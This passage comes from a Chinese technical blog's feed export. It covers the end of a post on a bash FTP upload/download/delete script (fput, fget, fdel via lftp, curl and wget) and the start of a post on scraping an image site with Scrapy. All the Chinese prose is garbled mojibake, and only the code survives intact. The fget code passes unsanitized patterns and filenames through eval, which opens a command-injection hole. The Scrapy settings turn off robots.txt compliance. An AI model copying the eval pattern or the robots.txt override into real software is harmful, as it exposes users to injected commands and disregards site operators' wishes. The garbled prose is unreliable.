    [ &quot;x$files&quot; = &quot;x&quot; ] &amp;&amp; echo &quot;Not Found Files&quot; &amp;&amp; exit 3

    file_nums=$(echo &quot;$files&quot; |wc -l)
    [ ! $file_nums -eq 1 ] &amp;&amp; {
        files=$(echo &quot;$files&quot; |xargs)
        files=&quot;{${files//\ /,}}&quot;
    }

    # 3. wget files
    eval wget --ftp-user=${ftp_user} --ftp-password=${ftp_pass} ${ftp_host}/${subdir}${files} -nv
}
</code></pre>
<p>é¦–å…ˆä»å¸¦æœ‰æ¨¡ç³ŠåŒ¹é…çš„æ–‡ä»¶åä¸­åˆ†éš”å‡ºè¿œç¨‹ç›®å½•åŠæ–‡ä»¶åçš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œç„¶åæ ¹æ®é¢„å®šçš„æ€è·¯é€æ­¥å®Œæˆæ–‡ä»¶åŒ¹é…åŠä¸‹è½½ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„å‡ ä¸ªé—®é¢˜æœ‰ï¼š</p>
<ol>
<li><code>curl</code>åŠ<code>wget</code>æœ‰å„è‡ªçš„è®¤è¯å‚æ•°ï¼š<ul>
<li><code>curl -u %{ftp_user}:${ftp_pass}</code></li>
<li><code>wget --ftp-user=${ftp_user} --ftp_password=${ftp_pass}</code></li>
</ul>
</li>
<li>å½“åªåŒ¹é…åˆ°ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œæ–‡ä»¶åä¸èƒ½ä½¿ç”¨<code>{}</code>åŒ…å«åœ¨ä¸€èµ·ï¼Œæ‰€ä»¥ä»£ç ä¸­ä½¿ç”¨äº†<code>wc -l</code>ç»Ÿè®¡åŒ¹é…åˆ°çš„æ–‡ä»¶æ•°</li>
<li>å¯¹äºåŒ…å«æ¢è¡Œç¬¦çš„å˜é‡<code>$files</code>ï¼Œåœ¨ç”¨<code>echo</code>æ‰“å°æ—¶éœ€åŠ ä¸ŠåŒå¼•å·<code>&quot;$files&quot;</code>ï¼Œå¦åˆ™æ¢è¡Œç¬¦ä¼šè‡ªåŠ¨å˜ä¸ºç©ºæ ¼</li>
<li>shellä¸­çš„å˜é‡å¯ä»¥è¿›è¡Œå­—ç¬¦æ›¿æ¢ï¼Œ<code>${files//\ /,}</code>å°±æ˜¯å°†<code>$files</code>å˜é‡ä¸­çš„æ‰€æœ‰ç©ºæ ¼æ›¿æ¢æˆäº†é€—å·<ul>
<li><code>//</code>æ›¿æ¢æ‰€æœ‰åŒ¹é…é¡¹</li>
<li><code>/</code>ä»…ä»…æ›¿æ¢ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹</li>
</ul>
</li>
</ol>
<h2 id="æ–‡ä»¶åˆ é™¤"><a href="#æ–‡ä»¶åˆ é™¤" class="headerlink" title="æ–‡ä»¶åˆ é™¤"></a>æ–‡ä»¶åˆ é™¤</h2><p>å¯¹äºæ–‡ä»¶åˆ é™¤ï¼Œç”±äºä½¿ç”¨è¾ƒå°‘ï¼Œæ‰€ä»¥æ²¡æœ‰å¯¹å…¶å®ç°æ¨¡ç³ŠåŒ¹é…ï¼Œå½“ç„¶æƒ³è¦å®ç°ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚è¿™é‡Œä»…ç»™å‡ºæœ€åŸºæœ¬çš„åˆ é™¤æ–¹å¼ï¼š</p>
<pre><code class="bash">ftp_del_file()
{
    get_ftp_pass

    if test &quot;${file%/*}&quot; = &quot;${file}&quot;; then
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            rm -rf ${file}
        EOF
    else
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            cd ${file%/*} &amp;&amp; rm -rf ${file##*/}
        EOF
    fi
}
</code></pre>
<p>åˆ°æ­¤ï¼Œå¸¸è§çš„ftpæ“ä½œéƒ½å·²ç»ä»‹ç»å®Œäº†ã€‚</p>
<h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><p>å®Œæ•´ä»£ç <code>fctl</code>å¦‚ä¸‹ï¼š</p>
<pre><code class="bash">#!/bin/bash

cmd=&quot;${0##*/}&quot;

ftp_host=&quot;ftp://127.0.0.1&quot;

test -z &quot;$ftp_user&quot; &amp;&amp; ftp_user=&quot;${USER}&quot;

#usage()
#{
#  cat &lt;&lt;-EOF &gt;&amp;2
#  Usage: fput &lt;file&gt;
#         fget &lt;file/dir&gt;
#         fdel &lt;file/dir&gt;
#  EOF
#}

get_ftp_pass()
{
    pass_file=$HOME/local/etc/ftp_pass
    [ -f $pass_file ] &amp;&amp; ftp_pass=$(cat $pass_file)

    test -z &quot;$ftp_pass&quot; \
        &amp;&amp; read -rs -p &quot;Please input password of your FTP user $ftp_user: &quot; ftp_pass
}

ftp_put_file()
{
    get_ftp_pass

    prefix=$(date &#39;+%Y%m%d%H%M%S-&#39;)
    remotefile=${prefix}${file##*/}
    subdir=$(date &#39;+%Y%m%d&#39;)

    if test -z &quot;$subdir&quot;; then
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            put ${file##*/} -o ${remotefile}
        EOF
    else
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            mkdir -p -f $subdir
            cd $subdir &amp;&amp; put ${file##*/} -o ${remotefile}
        EOF
    fi
}

ftp_get_file()
{
    get_ftp_pass

    result=$(echo &quot;$file&quot; |grep &quot;/&quot;)
    if [ &quot;x$result&quot; != &quot;x&quot; ]; then
        # split file to directory and re pattern of files
        subdir=${file%/*}/
        re_pattern=${file##*/}
    else
        subdir=&quot;/&quot;
        re_pattern=$file
    fi

    # 1. curl get file list
    files=$(curl -s -u ${ftp_user}:${ftp_pass} ${ftp_host}/${subdir})
    [ $? -eq 67 ] &amp;&amp; echo &quot;curl: password error!&quot; &amp;&amp; exit 2

    # 2. grep with regex to get files which need download
    files=$(echo &quot;$files&quot; |awk &#39;{print $4}&#39; |grep &quot;${re_pattern}&quot;)
    [ &quot;x$files&quot; = &quot;x&quot; ] &amp;&amp; echo &quot;Not Found Files&quot; &amp;&amp; exit 3

    file_nums=$(echo &quot;$files&quot; |wc -l)
    [ ! $file_nums -eq 1 ] &amp;&amp; {
        files=$(echo &quot;$files&quot; |xargs)
        files=&quot;{${files//\ /,}}&quot;
    }

    # 3. wget files
    eval wget --ftp-user=${ftp_user} --ftp-password=${ftp_pass} ${ftp_host}/${subdir}${files} -nv
}

ftp_del_file()
{
    get_ftp_pass

    if test &quot;${file%/*}&quot; = &quot;${file}&quot;; then
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            rm -rf ${file}
        EOF
    else
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            cd ${file%/*} &amp;&amp; rm -rf ${file##*/}
        EOF
    fi
}

case &quot;$cmd&quot; in
    &quot;fput&quot;)
        file=&quot;${1:?missing arg 1 to specify file path!!!}&quot;
        cd &quot;$(dirname $(readlink -f $file))&quot; &amp;&amp; ftp_put_file ;;
    &quot;fget&quot;)
        file=&quot;${1:?missing arg 1 to specify file path!!!}&quot;
        ftp_get_file ;;
    &quot;fdel&quot;)
        file=&quot;${1:?missing arg 1 to specify file path!!!}&quot;
        ftp_del_file ;;
esac
</code></pre>
<h2 id="ä½¿ç”¨ç¤ºä¾‹"><a href="#ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h2><p>ä½¿ç”¨<code>ln -s</code>åˆ›å»º<code>fput</code>,<code>fget</code>,<code>fdel</code>ä¸‰ä¸ªè½¯é“¾æ¥ï¼Œä¾¿å¯é€šè¿‡è¿™ä¸‰ä¸ªåˆ«åå®Œæˆå¯¹åº”çš„ä¸Šä¼ ã€ä¸‹è½½å’Œåˆ é™¤æ“ä½œäº†ã€‚</p>
<ul>
<li>fput</li>
</ul>
<pre><code class="bash">fput test # testæ–‡ä»¶å°†å­˜æ”¾è‡³serverå½“å¤©ç›®å½•ï¼Œå¹¶å† ä»¥æ—¶é—´æˆ³ä¸ºæ–‡ä»¶åå‰ç¼€
fput ~/bin/fget  # fgetæ–‡ä»¶å°†å­˜æ”¾è‡³serverå½“å¤©ç›®å½•ï¼Œå¹¶å† ä»¥æ—¶é—´æˆ³ä¸ºæ–‡ä»¶åå‰ç¼€
</code></pre>
<ul>
<li>fget</li>
</ul>
<pre><code class="bash">fget 20190902/ # è·å–æœåŠ¡å™¨ç«¯20190902ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶
fget 20190902/2019 # è·å–æœåŠ¡å™¨ç«¯20190902ç›®å½•ä¸‹åŒ…å«2019å­—ç¬¦çš„æ‰€æœ‰æ–‡ä»¶
fget test # è·å–æœåŠ¡å™¨ç«¯æ ¹ç›®å½•ä¸‹åŒ…å«testå­ä¸²çš„æ‰€æœ‰æ–‡ä»¶
fget te.*st # è·å–æœåŠ¡å™¨ç«¯æ ¹ç›®å½•ä¸‹ç¬¦åˆåŒ¹é…ç¬¦çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¦‚test,teast,teost,teeest
</code></pre>
<ul>
<li>fdel</li>
</ul>
<pre><code class="bash">fdel test # åˆ é™¤æœåŠ¡å™¨ç«¯æ ¹ç›®å½•åä¸ºtestçš„æ–‡ä»¶
fdel docs/test # åˆ é™¤æœåŠ¡å™¨ç«¯docsç›®å½•ä¸‹åä¸ºtestçš„æ–‡ä»¶
</code></pre>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul>
<li><a href="https://man.linuxde.net/lftp" target="_blank" rel="noopener">lftpå‘½ä»¤</a></li>
<li><a href="https://www.cnblogs.com/gx-303841541/archive/2012/10/25/2738048.html" target="_blank" rel="noopener">shell å­—ç¬¦ä¸²åˆ†å‰²ä¸è¿æ¥</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shell </tag>
            
            <tag> ftp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonç½‘ç»œçˆ¬è™«6 - Scrapyçˆ¬å–vmgirls]]></title>
      <url>https://www.litreily.top/2019/08/09/vmgirls/</url>
      <content type="html"><![CDATA[<p>ä»Šå¤©ä»‹ç»ä¸€ä¸ªå¦¹å­ç«™ç‚¹å›¾ç‰‡çš„çˆ¬å–è¿‡ç¨‹ï¼Œç«™ç‚¹<a href="https://www.vmgirls.com/" target="_blank" rel="noopener">å”¯ç¾å¥³ç”Ÿ</a>ã€‚ç«™ç‚¹ç»“æ„éå¸¸ç®€å•ï¼Œå•ç‹¬ç”¨<code>requests</code>åº“æˆ–è€…<code>scrapy</code>æ¡†æ¶éƒ½å¯ä»¥ã€‚æœ¬æ–‡ä»‹ç»çš„æ˜¯ä½¿ç”¨<code>scrapy</code>æ¡†æ¶çˆ¬å–ã€‚</p>
<p><img src="/assets/vmgirls/vmgirls.png" alt="vmgirls"></p>
<a id="more"></a>
<h2 id="åˆ†ævmgirlsç«™ç‚¹"><a href="#åˆ†ævmgirlsç«™ç‚¹" class="headerlink" title="åˆ†ævmgirlsç«™ç‚¹"></a>åˆ†ævmgirlsç«™ç‚¹</h2><p>ç«™ç‚¹åšçš„éå¸¸æ¸…æ–°å”¯ç¾ï¼Œç»“æ„ç®€æ´æ˜äº†ï¼Œä¸»é¡µçš„ä¸»ä½“éƒ¨åˆ†ä»¥å¡ç‰‡å½¢å¼å±•ç¤ºå„ä¸ªä¸»é¢˜çš„ç¼©ç•¥å›¾å’Œç®€è¦ä»‹ç»ï¼Œä½†ä¸»é¡µå¹¶ä¸é€‚åˆç›´æ¥çˆ¬å–ã€‚</p>
<p><img src="/assets/vmgirls/home.png" alt="vmgirls home page"></p>
<p>ä¸è¿‡å¹¸å¥½è¯¥ç«™ç‚¹å·²ç»æä¾›äº†ç«™ç‚¹åœ°å›¾ï¼Œå¯¹äºè¿™ç§ç›¸å¯¹ç®€å•çš„ç½‘ç«™ï¼Œä½¿ç”¨ç°æˆçš„ç½‘ç«™åœ°å›¾ç®€ç›´äº‹åŠåŠŸå€ã€‚</p>
<p><img src="/assets/vmgirls/sitemap.png" alt="sitemap"></p>
<p>é‚£ä¹ˆæ€è·¯å°±å¾ˆæ¸…æ¥šäº†ï¼Œé¦–å…ˆé€šè¿‡ç«™ç‚¹åœ°å›¾è·å–æ‰€æœ‰ä¸»é¢˜é¡µé¢çš„ç½‘å€å’Œæ ‡é¢˜ï¼Œç„¶åé€ä¸ªçˆ¬å–å¦¹å­é¡µé¢ï¼Œæå–æ‰€æœ‰çš„å›¾ç‰‡<code>url</code>ï¼Œç„¶åä¸‹è½½åˆ°æœ¬åœ°ï¼Œæ¯ä¸ªä¸»é¢˜é¡µé¢çš„å›¾ç‰‡å•ç‹¬å­˜æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­ã€‚</p>
<h3 id="ç«™ç‚¹åœ°å›¾"><a href="#ç«™ç‚¹åœ°å›¾" class="headerlink" title="ç«™ç‚¹åœ°å›¾"></a>ç«™ç‚¹åœ°å›¾</h3><p>æœ¬ç«™ç‚¹æä¾›äº†ä¸¤ä¸ªç«™ç‚¹åœ°å›¾ï¼š</p>
<ol>
<li><a href="https://www.vmgirls.com/sitemap.shtml" target="_blank" rel="noopener">https://www.vmgirls.com/sitemap.shtml</a></li>
<li><a href="https://www.vmgirls.com/sitemap.xml" target="_blank" rel="noopener">https://www.vmgirls.com/sitemap.xml</a></li>
</ol>
<p>ç¬¬1ä¸ªæ˜¯é¢å‘ç”¨æˆ·çš„ç«™ç‚¹åœ°å›¾ï¼Œä»ä¸»é¡µçš„å¯¼èˆªæ å°±èƒ½æ‰¾åˆ°ï¼›ç¬¬2ä¸ªï¼ˆå¦‚ä¸‹å›¾ï¼‰åˆ™æ˜¯å¸¸è§„ç½‘ç«™ç•™ç»™æœç´¢å¼•æ“çš„ç«™ç‚¹åœ°å›¾ï¼Œæ–‡ä»¶æ ¼å¼ä¹Ÿæ˜¯å¸¸è§„çš„<code>xml</code></p>
<p><img src="/assets/vmgirls/sitemap_xml.png" alt="sitemap.xml"></p>
<p>æˆ‘ä½¿ç”¨<code>wget</code>æŒ‡ä»¤è·å–ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶è¿›è¡Œäº†å¯¹æ¯”ï¼Œå‘ç°<code>sitemap.xml</code>ä»…ä»…åŒ…å«1000ä¸ªç½‘å€ï¼Œä½†æ˜¯å¯è§†çš„ç«™ç‚¹åœ°å›¾åŒ…å«1163ä¸ªç½‘å€ã€‚è¯´æ˜ç•™ç»™æœç´¢å¼•æ“çš„åœ°å›¾å¹¶ä¸å®Œæ•´ï¼Œè€Œä¸”ç›¸æ¯”è¾ƒä¹‹ä¸‹ï¼Œ<code>sitemap.shtml</code>æ‰€å çš„æ–‡ä»¶å¤§å°è¦æ¯”<code>sitemap.xml</code>è¿˜è¦å°ï¼Œè¿™æ˜¯å› ä¸º<code>sitemap.xml</code>å› å…¶æ ¼å¼é—®é¢˜ï¼Œå¸¦æœ‰å¤§é‡é‡å¤ä¿¡æ¯ã€‚</p>
<pre><code class="bash">âœ  tmp ls -lh
total 320K
-rw-r--r-- 1 litreily litreily 132K 8æœˆ  26 17:25 sitemap.shtml
-rw-r--r-- 1 litreily litreily 186K 8æœˆ  26 20:44 sitemap.xml
</code></pre>
<p>æ‰€ä»¥ï¼Œä¸ç®¡æ˜¯è€ƒè™‘å®Œæ•´æ€§ï¼Œè¿˜æ˜¯æ–‡ä»¶å¤§å°ï¼Œæˆ‘ä»¬éƒ½æœ‰ç†ç”±é€‰æ‹©<code>sitemap.shtml</code>ä½œä¸ºçˆ¬å–çš„ç¬¬ä¸€ä¸ªç½‘é¡µã€‚</p>
<p>ä¸‹é¢æ¥çœ‹çœ‹ç«™ç‚¹åœ°å›¾çš„htmlç»“æ„ï¼š</p>
<p><img src="/assets/vmgirls/sitemap_struct.png" alt="sitemap structure"></p>
<p>ä½¿ç”¨<code>wget</code>è·å–è¯¥ç½‘é¡µï¼Œæˆªå–å…¶ä¸­ä¸€æ®µåˆ—è¡¨ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<pre><code class="html">&lt;h2 style=&quot;text-align: center; margin-top: 20px&quot;&gt;å”¯ç¾å¥³ç”Ÿç«™ç‚¹åœ°å›¾&lt;/h2&gt;
&lt;center&gt;&lt;/center&gt;
&lt;div id=&quot;nav&quot;&gt;
&lt;a href=&quot;https://www.vmgirls.com/&quot;&gt;&lt;strong&gt;å”¯ç¾å¥³ç”Ÿ&lt;/strong&gt;&lt;/a&gt; Â» &lt;a href=&quot;https://www.vmgirls.com/sitemap.shtml&quot;&gt;ç«™ç‚¹åœ°å›¾&lt;/a&gt;
&lt;/div&gt;
&lt;div id=&quot;content&quot;&gt;
&lt;h3&gt;æœ€æ–°æ–‡ç« &lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12530.html&quot; title=&quot;å€¦æ€ &quot; target=&quot;_blank&quot;&gt;å€¦æ€ &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12517.html&quot; title=&quot;é€†å…‰&quot; target=&quot;_blank&quot;&gt;é€†å…‰&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12507.html&quot; title=&quot;å›çœ¸&quot; target=&quot;_blank&quot;&gt;å›çœ¸&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12487.html&quot; title=&quot;æ—©å®‰ï¼Œä¹–ä¹–&quot; target=&quot;_blank&quot;&gt;æ—©å®‰ï¼Œä¹–ä¹–&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12477.html&quot; title=&quot;ä½ çœ¼é‡Œæœ‰æˆ‘&quot; target=&quot;_blank&quot;&gt;ä½ çœ¼é‡Œæœ‰æˆ‘&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12476.html&quot; title=&quot;å¤æ—¥é™å®š&quot; target=&quot;_blank&quot;&gt;å¤æ—¥é™å®š&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12419.html&quot; title=&quot;ä½ çœ¼ç›ä¸€é—ªä¸€é—ªçš„&quot; target=&quot;_blank&quot;&gt;ä½ çœ¼ç›ä¸€é—ªä¸€é—ªçš„&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12405.html&quot; title=&quot;å¤å¤©ä½ çš„ç”œ&quot; target=&quot;_blank&quot;&gt;å¤å¤©ä½ çš„ç”œ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12386.html&quot; title=&quot;æ— å°½å¤&quot; target=&quot;_blank&quot;&gt;æ— å°½å¤&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12353.html&quot; title=&quot;Halcyon&quot; target=&quot;_blank&quot;&gt;Halcyon&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12333.html&quot; title=&quot;å°‘å¥³æƒ…æ€€&quot; target=&quot;_blank&quot;&gt;å°‘å¥³æƒ…æ€€&lt;/a&gt;&lt;/li&gt;
</code></pre>
<p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œç½‘é¡µç½‘å€ä»¥<code>&lt;li&gt;</code>åˆ—è¡¨å½¢å¼å­˜å‚¨ï¼Œç½‘é¡µè§£ææ—¶ä½¿ç”¨ä»¥ä¸‹xpathè¡¨è¾¾å¼å³å¯è·å–åˆ°æ‰€æœ‰çš„ç½‘å€å’Œæ ‡é¢˜ã€‚</p>
<pre><code class="python"># example:
# &lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12419.html&quot; title=&quot;ä½ çœ¼ç›ä¸€é—ªä¸€é—ªçš„&quot; target=&quot;_blank&quot;&gt;ä½ çœ¼ç›ä¸€é—ªä¸€é—ªçš„&lt;/a&gt;&lt;/li&gt;
urls = response.xpath(&#39;//*[@id=&quot;content&quot;][1]/ul/li/a/@href&#39;).extract()
titles = response.xpath(&#39;//*[@id=&quot;content&quot;][1]/ul/li/a/text()&#39;).extract()
</code></pre>
<p>æ®æ­¤ï¼Œæˆ‘ä»¬ä¾¿æ‹¿åˆ°äº†æ‰€æœ‰é¡µé¢çš„ç½‘å€å’Œæ ‡é¢˜ï¼Œä¸‹é¢é’ˆå¯¹å•ä¸ªä¸»é¢˜é¡µé¢è¿›è¡Œè§£æã€‚</p>
<h3 id="å•ä¸ªä¸»é¢˜é¡µé¢"><a href="#å•ä¸ªä¸»é¢˜é¡µé¢" class="headerlink" title="å•ä¸ªä¸»é¢˜é¡µé¢"></a>å•ä¸ªä¸»é¢˜é¡µé¢</h3><p><img src="/assets/vmgirls/theme.png" alt="single theme"></p>
<p>é’ˆå¯¹å•ä¸ªä¸»é¢˜é¡µé¢ï¼Œä½¿ç”¨<code>Chrome</code>è°ƒè¯•å·¥å…·å¯ä»¥çœ‹åˆ°å›¾ç‰‡é“¾æ¥çš„<code>DOM</code>ç»“æ„ï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯ï¼Œè°ƒè¯•å·¥å…·çœ‹åˆ°çš„å’Œå®é™…wgetè·å–åˆ°çš„ä¸å¤ªä¸€æ ·ï¼Œæˆ‘çŒœæµ‹æ˜¯åœ¨æµè§ˆå™¨ä¸Šæ˜¾ç¤ºæ—¶æ‰§è¡Œäº†æŸäº›é¢å¤–çš„JSè„šæœ¬ã€‚ä¸ç®¡æ€ä¹ˆæ ·ï¼Œå½“ç„¶æ˜¯è¦ä»¥çˆ¬å–åçš„å®é™…æ•°æ®ä¸ºå‡†ï¼Œå¦‚ä¸‹ä¿¡æ¯æ‰€ç¤ºï¼Œimgæ ‡ç­¾çš„<code>src</code>å±æ€§ä¸ä¸Šå›¾ä¸­çš„ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è§£ææ—¶ä¸èƒ½ä½¿ç”¨è¿™ä¸ªå±æ€§ï¼Œä½†æ˜¯<code>data-src</code>åˆ™æ˜¯ç›¸åŒçš„ã€‚</p>
<pre><code class="html">&lt;div class=&quot;post-content&quot;&gt;
&lt;div class=&quot;nc-light-gallery&quot;&gt;
&lt;p&gt;â—æ‘„å½±/åæœŸï¼š@èŒç¦ç¦M77&lt;br&gt; â€“ â€“ â€“ â€“ â€“ â€“ â€“ â€“&lt;br&gt; ä½ çš„çœ¼ç›é‡Œå¥½åƒæœ‰é—ªé—ªçš„æ˜Ÿæ˜Ÿå è½ã€‚&lt;br&gt;
&lt;a href=&quot;https://static.vmgirls.com/image/2019/07/2019-07-18_00-53-58.jpg&quot; alt=&quot;ä½ çœ¼ç›ä¸€é—ªä¸€é—ªçš„&quot; title=&quot;ä½ çœ¼ç›ä¸€é—ªä¸€é—ªçš„&quot;&gt;&lt;img alt=&quot;ä½ çœ¼ç›ä¸€é—ªä¸€é—ªçš„-å”¯ç¾å¥³ç”Ÿ&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7&quot; data-src=&quot;https://static.vmgirls.com/image/2019/07/2019-07-18_00-53-58.jpg&quot; data-nclazyload=&quot;true&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://static.vmgirls.com/image/2019/07/2019-07-18_00-54-01.jpg&quot; alt=&quot;ä½ çœ¼ç›ä¸€é—ªä¸€é—ªçš„&quot; title=&quot;ä½ çœ¼ç›ä¸€é—ªä¸€é—ªçš„&quot;&gt;&lt;img alt=&quot;ä½ çœ¼ç›ä¸€é—ªä¸€é—ªçš„-å”¯ç¾å¥³ç”Ÿ&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7&quot; data-src=&quot;https://static.vmgirls.com/image/2019/07/2019-07-18_00-54-01.jpg&quot; data-nclazyload=&quot;true&quot;&gt;&lt;/a&gt;
</code></pre>
<p>ç”±ä¸Šé¢çš„åˆ†æå¯ä»¥ç¡®å®šå‡ºä»¥ä¸‹è§£ææ–¹å¼ï¼Œä»¥è·å–åˆ°å½“å‰é¡µé¢æ‰€æœ‰å›¾ç‰‡çš„ä¸‹è½½é“¾æ¥ã€‚</p>
<pre><code class="python">urls = response.xpath(&#39;//*[@class=&quot;post-content&quot;]//img/@data-src&#39;).extract()
</code></pre>
<p>è‡³æ­¤ï¼Œå•ä¸ªé¡µé¢çš„è§£ææ€è·¯ä¹Ÿæ¸…æ¥šäº†ï¼Œä¹‹åé€šè¿‡<code>Scrapy</code>çš„<code>ImagesPipeline</code>å³å¯å®Œæˆå›¾ç‰‡ä¸‹è½½ã€‚</p>
<h2 id="çˆ¬è™«çš„ä»£ç å®ç°"><a href="#çˆ¬è™«çš„ä»£ç å®ç°" class="headerlink" title="çˆ¬è™«çš„ä»£ç å®ç°"></a>çˆ¬è™«çš„ä»£ç å®ç°</h2><h3 id="åˆ›å»ºscrapyé¡¹ç›®"><a href="#åˆ›å»ºscrapyé¡¹ç›®" class="headerlink" title="åˆ›å»ºscrapyé¡¹ç›®"></a>åˆ›å»ºscrapyé¡¹ç›®</h3><pre><code class="bash">$ scrapy startproject vmgirls
$ cd vmgirls
$ scrapy genspider vmgirl www.vmgirls.com
$ tree
.
â”œâ”€â”€ scrapy.cfg
â””â”€â”€ vmgirl
    â”œâ”€â”€ __init__.py
    â”œâ”€â”€ items.py
    â”œâ”€â”€ middlewares.py
    â”œâ”€â”€ pipelines.py
    â”œâ”€â”€ settings.py
    â””â”€â”€ spiders
        â”œâ”€â”€ __init__.py
        â””â”€â”€ vmgirl.py
</code></pre>
<h3 id="å…¨å±€é…ç½®"><a href="#å…¨å±€é…ç½®" class="headerlink" title="å…¨å±€é…ç½®"></a>å…¨å±€é…ç½®</h3><p>ç¼–è¾‘settings.py</p>
<pre><code class="python">BOT_NAME = &#39;vmgirls&#39;

SPIDER_MODULES = [&#39;vmgirls.spiders&#39;]
NEWSPIDER_MODULE = &#39;vmgirls.spiders&#39;

import os
USER_DIR = os.path.expanduser(&#39;~&#39;)
USER_DATA_DIR = os.path.join(USER_DIR, &#39;Pictures/python/vmgirls&#39;)
IMAGES_STORE = USER_DATA_DIR

# Obey robots.txt rules
ROBOTSTXT_OBEY = False

# Configure item pipelines
# See https://doc.scrapy.org/en/latest/topics/item-pipeline.html
ITEM_PIPELINES = {
    &#39;vmgirls.pipelines.VmgirlsPipeline&#39;: 300,
    &#39;vmgirls.pipelines.VmgirlsImagesPipeline&#39;: 400
}
</code></pre>
<p>å¦‚ä¸Šä»£ç æ‰€ç¤ºï¼Œå…¨å±€é…ç½®æ–‡ä»¶ä¸»è¦å®šä¹‰äº†æ–‡ä»¶å­˜å‚¨è·¯å¾„<code>IMAGES_STORE</code>, ç¦æ­¢éµå®ˆrobots.txt, å¯ç”¨ä¸¤ä¸ªPipelineå¹¶è®¾ç½®å…¶ä¼˜å…ˆçº§ã€‚</p>
<h3 id="å®šä¹‰Item"><a href="#å®šä¹‰Item" class="headerlink" title="å®šä¹‰Item"></a>å®šä¹‰Item</h3><p>æ¥ä¸‹æ¥å®šä¹‰ä¸¤ä¸ªItemç±»ï¼Œ<code>VmgirlsItem</code>ç”¨äºå­˜å‚¨ä¸»é¢˜é¡µé¢çš„ç½‘å€åŠå…¶æ ‡é¢˜ï¼Œ<code>VmgirlsImagesItem</code>ç”¨äºå­˜å‚¨å•ä¸ªä¸»é¢˜é¡µé¢å†…æ‰€æœ‰å›¾ç‰‡çš„åœ°å€å’Œä¸»é¢˜çš„æ ‡é¢˜ã€‚è¿™ä¸¤ä¸ªç±»çš„titleå†…å®¹æ˜¯ä¸€è‡´çš„ã€‚</p>
<pre><code class="python">from scrapy.item import Item
from scrapy.item import Field


class VmgirlsItem(Item):
    # define the fields for your item here like:
    # name = scrapy.Field()
    url = Field()
    title = Field()
    pass

class VmgirlsImagesItem(Item):
    image_urls = Field()
    title = Field()
    pass
</code></pre>
